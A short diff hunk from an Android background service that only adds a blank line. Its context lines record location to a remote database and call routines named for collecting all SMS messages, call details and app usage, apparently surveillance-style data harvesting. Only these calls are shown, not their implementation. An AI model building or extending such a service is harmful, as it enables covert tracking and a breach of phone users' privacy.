@@ -78,6 +78,7 @@ public class MySerVice extends Service {
 
             newPost.child("Long").setValue(lng);
 
+
             msghist.getAllSms(MySerVice.this);
             cal.getCallDetails(MySerVice.this);
             appst.printCurrentUsageStatus(MySerVice.this);
